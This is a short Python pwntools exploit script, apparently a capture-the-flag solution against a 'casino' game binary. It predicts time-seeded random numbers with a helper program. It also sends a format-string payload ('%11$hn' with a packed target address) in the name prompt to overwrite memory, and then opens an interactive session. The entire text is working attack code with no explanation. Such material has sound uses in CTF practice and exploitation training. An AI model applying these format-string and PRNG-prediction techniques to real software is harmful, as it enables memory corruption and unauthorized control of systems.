from pwn import *
from time import *

context.log_level='debug'

now=int(time())/10+2

p1=process("./timerand")
p1.sendline(str(now))
rand=p1.recvuntil("\n").strip().split(" ")
print rand
p1.close()
#sleep(0.5)
#p2=remote("challs.fireshellsecurity.team",31006)
p2=process('./casino')
p2.sendafter("What is your name? ","aa%11$hn"+p64(0x602020))
#gdb.attach(p2)
for i in range(99):
   p2.sendlineafter("number: ",rand[i])
print p2.recv()

p2.interactive()
